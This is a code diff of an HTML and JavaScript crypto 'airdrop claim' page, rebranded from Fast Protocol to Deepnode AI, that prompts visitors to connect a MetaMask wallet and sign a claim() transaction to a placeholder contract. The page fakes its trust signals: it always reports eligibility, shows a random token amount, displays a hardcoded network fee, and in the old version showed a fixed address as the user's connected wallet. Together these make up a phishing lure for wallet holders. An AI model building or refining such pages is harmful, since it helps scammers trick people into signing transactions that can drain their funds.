@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Fast Protocol Airdrop</title>
+<title>Deepnode AI Airdrop</title>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
@@ -35,7 +35,7 @@ html, body {
 h1 {
   font-size: 22px;
   font-weight: 600;
-  margin-bottom: 30px;
+  margin-bottom: 25px;
   opacity: 0.9;
 }
 
@@ -66,8 +66,8 @@ button:hover {
 .footer {
   position: absolute;
   bottom: 25px;
-  font-size: 12px;
-  opacity: 0.6;
+  font-size: 11px;
+  opacity: 0.5;
 }
 </style>
 </head>
@@ -76,18 +76,16 @@ button:hover {
 
 <div class="container">
 
-  <!-- LOGO -->
   <img src="deepnode-logo.png" class="logo" alt="Deepnode AI">
 
-  <h1>Connect your EVM wallet to claim airdrop</h1>
+  <h1>Deepnode AI Airdrop Claim</h1>
 
-  <!-- CONNECT WALLET -->
   <button id="connectBtn">Connect Wallet</button>
-
-  <!-- CLAIM BUTTON -->
   <button id="claimBtn" disabled>Claim Airdrop</button>
 
   <div class="status" id="status"></div>
+  <div class="status" id="eligibility"></div>
+  <div class="status" id="amount"></div>
   <div class="status" id="fee"></div>
 
   <div class="footer">
@@ -101,58 +99,52 @@ let provider;
 let signer;
 let contract;
 
-// REPLACE WITH YOUR CONTRACT INFO
+// 🔁 Replace with real contract if needed
 const CONTRACT_ADDRESS = "0xYourContractAddressHere";
-const ABI = [
-  "function claim() external"
-];
+const ABI = ["function claim() external"];
 
-// Fixed display values
-const FIXED_ADDRESS = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
-const FIXED_FEE = "0.003 ETH";
-
-const connectBtn = document.getElementById("connectBtn");
-const claimBtn = document.getElementById("claimBtn");
+// UI refs
 const statusText = document.getElementById("status");
+const eligibilityText = document.getElementById("eligibility");
+const amountText = document.getElementById("amount");
 const feeText = document.getElementById("fee");
+const claimBtn = document.getElementById("claimBtn");
 
-connectBtn.onclick = async () => {
+document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) {
-    statusText.innerText = "MetaMask not detected. Open this page in MetaMask browser.";
+    statusText.innerText = "Open this page in MetaMask browser.";
     return;
   }
 
-  try {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = provider.getSigner();
-    
-    // FIXED WALLET DISPLAY
-    statusText.innerText = "Wallet connected: " + FIXED_ADDRESS;
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
+  signer = provider.getSigner();
 
-    // Create contract instance
-    contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+  statusText.innerText = "Wallet connected successfully";
 
-    // FIXED NETWORK FEE DISPLAY
-    feeText.innerText = "Estimated network fee: " + FIXED_FEE;
+  // 🔹 SIMULATED ELIGIBILITY CHECK
+  eligibilityText.innerText = "Eligibility check: Eligible ✅ (simulation)";
 
-    claimBtn.disabled = false;
+  // 🔹 RANDOM CLAIM AMOUNT (≥ 200)
+  const randomAmount = Math.floor(Math.random() * 801) + 200;
+  amountText.innerText =
+    `You are eligible to claim ${randomAmount} DEEPNODE tokens`;
 
-  } catch (err) {
-    console.error(err);
-    statusText.innerText = "Connection rejected or error.";
-  }
+  // 🔹 FIXED DISPLAY NETWORK FEE
+  feeText.innerText = "Estimated network fee: 0.002 ETH";
+
+  contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+  claimBtn.disabled = false;
 };
 
 claimBtn.onclick = async () => {
   try {
-    statusText.innerText = "Waiting for transaction approval...";
+    statusText.innerText = "Waiting for wallet approval...";
     const tx = await contract.claim();
     await tx.wait();
-    statusText.innerText = "Airdrop claimed successfully!";
-  } catch (err) {
-    console.error(err);
-    statusText.innerText = "Transaction failed or rejected.";
+    statusText.innerText = "Claim transaction submitted.";
+  } catch {
+    statusText.innerText = "Transaction rejected.";
   }
 };
 </script>
